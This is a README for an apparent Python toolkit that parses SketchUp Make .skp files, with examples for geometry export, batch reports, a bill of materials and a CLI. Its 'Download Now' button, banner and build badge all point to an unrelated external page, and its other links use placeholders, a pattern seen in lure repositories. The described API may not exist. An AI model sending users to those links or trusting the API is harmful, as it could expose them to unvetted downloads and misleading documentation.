# sketchup-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://Ibrahim-AbdElwahab.github.io/sketchup-page-8w5/)


[![Banner](banner.png)](https://Ibrahim-AbdElwahab.github.io/sketchup-page-8w5/)


[![Python Version](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![PyPI version](https://img.shields.io/badge/pypi-v0.4.2-orange.svg)](https://pypi.org/project/sketchup-toolkit/)
[![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)](https://Ibrahim-AbdElwahab.github.io/sketchup-page-8w5/)
[![Code Style](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

A Python toolkit for automating workflows, parsing files, and extracting geometry and metadata from SketchUp Make projects on Windows environments.

SketchUp Make is a widely used free 3D modeling application for Windows — this toolkit provides a programmatic interface to work with `.skp` files, automate repetitive tasks, and integrate SketchUp Make data into broader Python-based pipelines. Whether you are processing architectural models, analyzing component hierarchies, or batch-converting geometry data, `sketchup-toolkit` gives you the building blocks to do it efficiently.

---

## Table of Contents

- [Features](#features)
- [Requirements](#requirements)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage Examples](#usage-examples)
- [Project Structure](#project-structure)
- [Contributing](#contributing)
- [License](#license)

---

## Features

- **SKP File Parsing** — Read and inspect `.skp` file contents including layers, components, groups, and material definitions without launching the SketchUp Make GUI
- **Geometry Extraction** — Extract vertex coordinates, face normals, and edge data into structured Python objects or export to standard formats (OBJ, JSON, CSV)
- **Metadata Analysis** — Retrieve model metadata such as creation date, author, units, and custom attribute dictionaries attached to entities
- **Batch Processing** — Iterate over directories of `.skp` files to apply transformations, generate reports, or validate model structure at scale
- **Component Inventory** — Build component trees and count instances, useful for bill-of-materials generation in woodworking or architectural workflows
- **Windows Path Handling** — Native support for Windows-style paths and SketchUp Make's default file locations on Windows 10 and Windows 11
- **Export Pipeline Integration** — Hook into SketchUp Make's export capabilities programmatically to produce 2D drawings or 3D mesh outputs as part of a larger pipeline
- **Lightweight CLI** — A built-in command-line interface for quick one-off operations without writing a script

---

## Requirements

| Requirement | Version / Notes |
|---|---|
| Python | 3.8 or higher |
| Operating System | Windows 10 / Windows 11 (primary support) |
| SketchUp Make | 2017 or later installed locally |
| `pythonnet` | >= 3.0.1 — COM bridge for Windows API calls |
| `trimesh` | >= 3.21.0 — Geometry processing utilities |
| `click` | >= 8.1.0 — CLI framework |
| `rich` | >= 13.0.0 — Terminal output formatting |
| `pydantic` | >= 2.0 — Data validation for model schemas |

> **Note:** Core file parsing features work without a SketchUp Make installation. Features that automate the SketchUp Make GUI or trigger exports require a valid local installation on Windows.

---

## Installation

**Install from PyPI:**

```bash
pip install sketchup-toolkit
```

**Install from source:**

```bash
git clone https://github.com/your-org/sketchup-toolkit.git
cd sketchup-toolkit
pip install -e ".[dev]"
```

**Install with all optional dependencies:**

```bash
pip install "sketchup-toolkit[full]"
```

---

## Quick Start

```python
from sketchup_toolkit import SKPFile

# Load a SketchUp Make project file
model = SKPFile.load("C:/Users/you/Documents/my_model.skp")

print(f"Model name   : {model.name}")
print(f"Created by   : {model.metadata.author}")
print(f"Units        : {model.metadata.units}")
print(f"Layers       : {len(model.layers)}")
print(f"Components   : {len(model.components)}")

# Iterate over top-level entities
for entity in model.entities:
    print(entity.entity_type, entity.id)
```

**Expected output:**

```
Model name   : workshop_cabinet
Created by   : J. Hendricks
Units        : inches
Layers       : 5
Components   : 23
<EntityType.GROUP: 'group'> 1042
<EntityType.COMPONENT_INSTANCE: 'component_instance'> 1043
...
```

---

## Usage Examples

### Extract Geometry to JSON

Parse face and vertex data from a `.skp` file and write it to a structured JSON file for use in downstream tools or visualisation pipelines.

```python
import json
from sketchup_toolkit import SKPFile
from sketchup_toolkit.exporters import GeometryExporter

model = SKPFile.load("C:/Projects/house_model.skp")
exporter = GeometryExporter(model)

geometry_data = exporter.to_dict()  # vertices, faces, normals, materials

with open("house_model_geometry.json", "w") as f:
    json.dump(geometry_data, f, indent=2)

print(f"Exported {len(geometry_data['faces'])} faces.")
```

---

### Batch Process a Directory of SKP Files

Scan a folder of SketchUp Make files and generate a CSV report summarising each model's component count and bounding box dimensions.

```python
import csv
from pathlib import Path
from sketchup_toolkit import SKPFile
from sketchup_toolkit.analysis import BoundingBoxAnalyzer

skp_dir = Path("C:/Projects/models/")
report_rows = []

for skp_path in skp_dir.glob("**/*.skp"):
    try:
        model = SKPFile.load(skp_path)
        bbox = BoundingBoxAnalyzer(model).compute()
        report_rows.append({
            "file": skp_path.name,
            "components": len(model.components),
            "width_in":  round(bbox.width, 3),
            "height_in": round(bbox.height, 3),
            "depth_in":  round(bbox.depth, 3),
        })
    except Exception as exc:
        print(f"Skipping {skp_path.name}: {exc}")

with open("model_report.csv", "w", newline="") as csvfile:
    writer = csv.DictWriter(csvfile, fieldnames=report_rows[0].keys())
    writer.writeheader()
    writer.writerows(report_rows)

print(f"Report written for {len(report_rows)} models.")
```

---

### Build a Component Inventory (Bill of Materials)

Flatten the component hierarchy of a SketchUp Make model and count unique component definitions — useful for woodworking cut lists or architectural schedules.

```python
from sketchup_toolkit import SKPFile
from sketchup_toolkit.analysis import ComponentInventory

model = SKPFile.load("C:/Projects/bookshelf.skp")
inventory = ComponentInventory(model)

bom = inventory.build()

for item in bom.sorted_by_count():
    print(f"{item.name:<30} x{item.count:>4}   {item.dimensions_str}")
```

**Sample output:**

```
shelf_panel                    x   6   48in x 10in x 0.75in
side_panel                     x   2   36in x 10in x 0.75in
back_panel                     x   1   48in x 36in x 0.25in
shelf_pin                      x  24   0.25in x 0.25in x 1in
```

---

### Read and Update Model Metadata

Access and modify the attribute dictionaries that SketchUp Make stores on model entities, then save the updated file.

```python
from sketchup_toolkit import SKPFile

model = SKPFile.load("C:/Projects/office_desk.skp")

# Read custom attributes set inside SketchUp Make
attrs = model.get_attribute_dict("project_info")
print(attrs)
# {'client': 'Acme Corp', 'revision': '3', 'status': 'draft'}

# Update an attribute and write back to disk
model.set_attribute("project_info", "status", "approved")
model.save("C:/Projects/office_desk_approved.skp")
print("Metadata updated and file saved.")
```

---

### CLI Usage

`sketchup-toolkit` ships with a CLI for quick tasks without writing a script.

```bash
# Print a summary of a model
sketchup-toolkit info "C:/Projects/cabinet.skp"

# Export geometry to OBJ format
sketchup-toolkit export --format obj "C:/Projects/cabinet.skp" --output ./exports/

# Generate a bill of materials as CSV
sketchup-toolkit bom "C:/Projects/cabinet.skp" --output cabinet_bom.csv

# Validate all SKP files in a directory
sketchup-toolkit validate "C:/Projects/models/"
```

---

## Project Structure

```
sketchup-toolkit/
├── sketchup_toolkit/
│   ├── __init__.py
│   ├── skp_file.py          # Core SKPFile class and file loader
│   ├── entities.py          # Entity model definitions (groups, faces, edges)
│   ├── metadata.py          # Metadata and attribute dictionary handling
│   ├── exporters/
│   │   ├── __init__.py
│   │   ├── geometry.py      # JSON / OBJ / CSV geometry exporters
│   │   └── drawing.py       # 2D drawing export helpers
│   ├── analysis/
│   │   ├── __init__.py
│   │   ├── bounding_box.py  # Bounding box computation
│   │   └── inventory.py     # Component inventory and BOM generation
│   └── cli.py               # Click-based CLI entry point
├── tests/
│   ├── fixtures/            # Sample .skp files for testing
│   ├── test_skp_file.py
│   ├── test_exporters.py
│   └── test_analysis.py
├── docs/
├── pyproject.toml
├── README.md
└── CHANGELOG.md
```

---

## Contributing

Contributions are welcome and appreciated. To get started:

1. Fork the repository and create a feature branch:
   ```bash
   git checkout -b feature/your-feature-name
   ```

2. Install development dependencies:
   ```bash
   pip install -e ".[dev]"
   ```

3. Run the test suite before submitting:
   ```bash
   pytest tests/ -v --cov=sketchup_toolkit
   ```

4. Follow the existing code style (`black` + `ruff` are configured in `pyproject.toml`).

5. Open a pull request with a clear description of what your change does and why.

Please read [CONTRIBUTING.md](CONTRIBUTING.md) for the full contribution guidelines, and check the [open issues](https://github.com/your-org/sketchup-toolkit/issues) for areas where help is needed.

---

## License

This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.

---

> **Disclaimer:** This toolkit is an independent open-source project and is not affiliated with, endorsed by, or officially connected to Trimble Inc. or the SketchUp product team. SketchUp and SketchUp Make are trademarks of Trimble Inc.